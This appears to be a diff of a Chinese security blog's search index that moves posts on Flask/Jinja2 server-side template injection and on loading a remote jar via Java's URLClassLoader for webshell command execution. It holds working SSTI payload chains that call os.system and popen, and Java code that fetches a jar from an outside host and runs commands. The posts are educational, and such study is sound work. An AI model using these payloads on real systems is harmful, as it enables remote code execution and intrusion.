@@ -1,97 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>FlaskSSTI利用</title>
-    <url>/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h3 id="SSTI成因"><a href="#SSTI成因" class="headerlink" title="SSTI成因"></a>SSTI成因</h3><p>主要是一些编程语言的框架在使用模板渲染引擎的函数时代码不规范，过分信任用户的输入造成的模板注入，比如python的Jinja2 mako tornado django；php的smarty twig，java的jade velocity</p>
-<p>这里主要分析一下python的Flask，不着重Flask的语法，从代码的角度分析成因</p>
-<span id="more"></span>
-
-<p>首先来看两端代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&#x27;name&#x27;</span>)<span class="comment"># 获取get方法传递的 name的值</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;demo_tmp.html&#x27;</span>, name = query)<span class="comment"># 将get接收到的name的值传入模板,进行渲染</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)  <span class="comment"># 开启 debug模式,每次修改代码后就不需要手动重启服务器,服务器会在代码修改后自动重新载入</span></span><br></pre></td></tr></table></figure>
-
-<p>创建一个放模板的templates目录，里面放入模板demo_tmp.html</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行python代码</p>
-<p>在端口输入127.0.0.1:5000,运行</p>
-<p>pyhtonFlask使用的模板引擎是jinja2</p>
-<p><code>模板中使用 &#123;&#123; &#125;&#125; 语法表示一个变量,它是一种特殊的占位符.当利用jinja2进行渲染的时候,它会把这些特殊的占位符进行填充/替换,jinja2支持python中所有的Python数据类型比如列表、字段、对象等.</code></p>
-<p>我们传入参数49，可以看到输出</p>
-<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313132852816.png" class>
-
-<p>没有输出49，说明不存在模板注入；</p>
-<p>在来看一段代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask</span><br><span class="line">from flask <span class="keyword">import</span> render_template</span><br><span class="line">from flask <span class="keyword">import</span> request</span><br><span class="line">from flask <span class="keyword">import</span> <span class="type">render_template_string</span></span><br><span class="line"></span><br><span class="line"><span class="variable">app</span> <span class="operator">=</span> Flask(__name__)</span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&quot;/index/&quot;</span>)</span><br><span class="line">def <span class="title function_">test</span><span class="params">()</span>:</span><br><span class="line">    Liwer = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;%s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span> % (request.args.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(Liwer)</span><br><span class="line"></span><br><span class="line"><span class="type">if</span> <span class="variable">__name__</span> <span class="operator">=</span>= <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
-
-<p>这是一段存在SSTI的代码</p>
-<p>输入?name&#x3D;49输出</p>
-<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313135542789.png" class>
-
-<p>对比上面两种代码，一个不会存在SSTI，一个存在；</p>
-<p>未产生漏洞的代码通过<code>render_template(&#39;demo_tmp.html&#39;, name = query)</code>进行渲染，要渲染的参数通过name &#x3D; query是写死的</p>
-<p>，用户不能控制；</p>
-<p>产生漏洞的的代码，将参数拼接到要渲染的Liwer参数中，如果我们的参数中存在<code>&#123;&#123;&#125;&#125;</code>，那么<code>render_template_string(template)</code>进行渲染的时候就会把 <code>&#123;&#123;&#125;&#125;</code>中的内容进行解析.</p>
-<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>多数人就会想，既然存在注入那好办，直接<code>&#123;&#123;import os;os.system('')&#125;&#125;</code>命令执行，答案是不行的，</p>
-<p>jinja2引擎限制了使用import，这时候python的内置的一些属性就可以发挥作用了</p>
-<h4 id="魔术方法和内置属性"><a href="#魔术方法和内置属性" class="headerlink" title="魔术方法和内置属性"></a>魔术方法和内置属性</h4><p><code>__class__</code>:返回该实例对象的类</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line"><span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>__base__</code>:返回该类的父类</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 及 object 是 str 的基类(父类)</span></span><br></pre></td></tr></table></figure>
-
-<p><code>__subclasses__</code>():返回当前类的所有子类,返回结果是个列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, ...</span></span><br></pre></td></tr></table></figure>
-
-<p>通过这些内置方法和属性我们间接的获取到了一些类，由于无法import，而一些子类和父类导入了一些模块的，如果存在我们需要的类，我们只需要初始化这个类，在利用<code>__globals__</code>调用可利用的函数,就能够达成我们的目的.</p>
-<p>例如，我们要命令执行，可以执行system函数，那么我们就可以初始化这个类</p>
-<p><code>&lt;class &#39;os._wrap_close&#39;&gt;</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>]</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313142007824.png" class>
-
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><strong><code>__builtins__</code></strong></p>
-<p>python在启动时就加载<code>__builtins__</code>,里面包含了一些常用方法比如:<code>abs()</code>,<code>max()</code>,<code>eval()</code>等等;</p>
-<p>如何查找那些类存在<code>__builtins__</code>，使用脚本查找</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exp_flask = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">number = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> exp_flask <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(number,<span class="string">&quot;--&gt;&gt;&quot;</span>,i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        number += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313143651822.png" class>
-
-<p>到目前为止就可以简单的构建payload</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>成功弹出计算器</p>
-<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313144624969.png" class>
-
-<p><strong><code>sys</code></strong></p>
-<p>通过上面的脚本查找sys</p>
-<p>构造payload</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&quot;whoami&quot;</span>).read()</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313145311172.png" class>
-
-<p><strong><code>__import__</code></strong></p>
-<p>同样使用脚本查找</p>
-<p>构造payload</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;calc.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Docker学习笔记一</title>
     <url>/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</url>
     <content><![CDATA[<h2 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h2><p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html">Go 语言</a> 并遵从 Apache2.0 协议开源。Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
@@ -201,6 +110,131 @@
       </tags>
   </entry>
   <entry>
+    <title>FlaskSSTI利用</title>
+    <url>/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h3 id="SSTI成因"><a href="#SSTI成因" class="headerlink" title="SSTI成因"></a>SSTI成因</h3><p>主要是一些编程语言的框架在使用模板渲染引擎的函数时代码不规范，过分信任用户的输入造成的模板注入，比如python的Jinja2 mako tornado django；php的smarty twig，java的jade velocity</p>
+<p>这里主要分析一下python的Flask，不着重Flask的语法，从代码的角度分析成因</p>
+<span id="more"></span>
+
+<p>首先来看两端代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&#x27;name&#x27;</span>)<span class="comment"># 获取get方法传递的 name的值</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;demo_tmp.html&#x27;</span>, name = query)<span class="comment"># 将get接收到的name的值传入模板,进行渲染</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)  <span class="comment"># 开启 debug模式,每次修改代码后就不需要手动重启服务器,服务器会在代码修改后自动重新载入</span></span><br></pre></td></tr></table></figure>
+
+<p>创建一个放模板的templates目录，里面放入模板demo_tmp.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行python代码</p>
+<p>在端口输入127.0.0.1:5000,运行</p>
+<p>pyhtonFlask使用的模板引擎是jinja2</p>
+<p><code>模板中使用 &#123;&#123; &#125;&#125; 语法表示一个变量,它是一种特殊的占位符.当利用jinja2进行渲染的时候,它会把这些特殊的占位符进行填充/替换,jinja2支持python中所有的Python数据类型比如列表、字段、对象等.</code></p>
+<p>我们传入参数49，可以看到输出</p>
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313132852816.png" class>
+
+<p>没有输出49，说明不存在模板注入；</p>
+<p>在来看一段代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask</span><br><span class="line">from flask <span class="keyword">import</span> render_template</span><br><span class="line">from flask <span class="keyword">import</span> request</span><br><span class="line">from flask <span class="keyword">import</span> <span class="type">render_template_string</span></span><br><span class="line"></span><br><span class="line"><span class="variable">app</span> <span class="operator">=</span> Flask(__name__)</span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&quot;/index/&quot;</span>)</span><br><span class="line">def <span class="title function_">test</span><span class="params">()</span>:</span><br><span class="line">    Liwer = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;%s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span> % (request.args.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(Liwer)</span><br><span class="line"></span><br><span class="line"><span class="type">if</span> <span class="variable">__name__</span> <span class="operator">=</span>= <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>这是一段存在SSTI的代码</p>
+<p>输入?name&#x3D;49输出</p>
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313135542789.png" class>
+
+<p>对比上面两种代码，一个不会存在SSTI，一个存在；</p>
+<p>未产生漏洞的代码通过<code>render_template(&#39;demo_tmp.html&#39;, name = query)</code>进行渲染，要渲染的参数通过name &#x3D; query是写死的</p>
+<p>，用户不能控制；</p>
+<p>产生漏洞的的代码，将参数拼接到要渲染的Liwer参数中，如果我们的参数中存在<code>&#123;&#123;&#125;&#125;</code>，那么<code>render_template_string(template)</code>进行渲染的时候就会把 <code>&#123;&#123;&#125;&#125;</code>中的内容进行解析.</p>
+<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>多数人就会想，既然存在注入那好办，直接<code>&#123;&#123;import os;os.system('')&#125;&#125;</code>命令执行，答案是不行的，</p>
+<p>jinja2引擎限制了使用import，这时候python的内置的一些属性就可以发挥作用了</p>
+<h4 id="魔术方法和内置属性"><a href="#魔术方法和内置属性" class="headerlink" title="魔术方法和内置属性"></a>魔术方法和内置属性</h4><p><code>__class__</code>:返回该实例对象的类</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line"><span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>__base__</code>:返回该类的父类</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 及 object 是 str 的基类(父类)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>__subclasses__</code>():返回当前类的所有子类,返回结果是个列表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, ...</span></span><br></pre></td></tr></table></figure>
+
+<p>通过这些内置方法和属性我们间接的获取到了一些类，由于无法import，而一些子类和父类导入了一些模块的，如果存在我们需要的类，我们只需要初始化这个类，在利用<code>__globals__</code>调用可利用的函数,就能够达成我们的目的.</p>
+<p>例如，我们要命令执行，可以执行system函数，那么我们就可以初始化这个类</p>
+<p><code>&lt;class &#39;os._wrap_close&#39;&gt;</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>]</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313142007824.png" class>
+
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><strong><code>__builtins__</code></strong></p>
+<p>python在启动时就加载<code>__builtins__</code>,里面包含了一些常用方法比如:<code>abs()</code>,<code>max()</code>,<code>eval()</code>等等;</p>
+<p>如何查找那些类存在<code>__builtins__</code>，使用脚本查找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exp_flask = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">number = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> exp_flask <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(number,<span class="string">&quot;--&gt;&gt;&quot;</span>,i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        number += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313143651822.png" class>
+
+<p>到目前为止就可以简单的构建payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器</p>
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313144624969.png" class>
+
+<p><strong><code>sys</code></strong></p>
+<p>通过上面的脚本查找sys</p>
+<p>构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&quot;whoami&quot;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313145311172.png" class>
+
+<p><strong><code>__import__</code></strong></p>
+<p>同样使用脚本查找</p>
+<p>构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;calc.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利用UrlClassLoader远程加载jar包</title>
+    <url>/2022/03/07/%E5%88%A9%E7%94%A8UrlClassLoader%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDjar%E5%8C%85/</url>
+    <content><![CDATA[<h3 id="UrlClassLoader"><a href="#UrlClassLoader" class="headerlink" title="UrlClassLoader"></a>UrlClassLoader</h3><p>URLClassLoader继承了ClassLoader,可以加载本地磁盘和网络上的jar包，并调用其中的方法，在利用webshell时可以很好的使用此方法执行命令</p>
+<span id="more"></span>
+
+<p>首先在远程服务器上存在一个cmd.jar文件</p>
+<p><a href="https://anbai.io/tools/cmd.jar">https://anbai.io/tools/cmd.jar</a></p>
+<p>下载后通过XJad反编译查看java文件的代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">CMD</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String s)</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">throws</span> IOException</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> Runtime.getRuntime().exec(s);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在CMD.java中存在以一个CMD方法，存在一个参数执行命令</p>
+<p>使用UrlClassLoader加载此jar包</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://anbai.io/tools/cmd.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">ucl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cmdClass</span> <span class="operator">=</span> ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            <span class="type">InputStream</span>           <span class="variable">in</span>   <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译运行后成功弹出计算器</p>
+<img src="/2022/03/07/%E5%88%A9%E7%94%A8UrlClassLoader%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDjar%E5%8C%85/image-20220307201611048.png" class>
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>javasec</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Flask开启debug的安全问题</title>
     <url>/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果Flask开启了debug模式，在debug页面中包含了python的交互式shell，可以执行任意的python代码</p>
@@ -286,40 +320,6 @@
       </categories>
       <tags>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用UrlClassLoader远程加载jar包</title>
-    <url>/2022/03/07/%E5%88%A9%E7%94%A8UrlClassLoader%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDjar%E5%8C%85/</url>
-    <content><![CDATA[<h3 id="UrlClassLoader"><a href="#UrlClassLoader" class="headerlink" title="UrlClassLoader"></a>UrlClassLoader</h3><p>URLClassLoader继承了ClassLoader,可以加载本地磁盘和网络上的jar包，并调用其中的方法，在利用webshell时可以很好的使用此方法执行命令</p>
-<span id="more"></span>
-
-<p>首先在远程服务器上存在一个cmd.jar文件</p>
-<p><a href="https://anbai.io/tools/cmd.jar">https://anbai.io/tools/cmd.jar</a></p>
-<p>下载后通过XJad反编译查看java文件的代码</p>
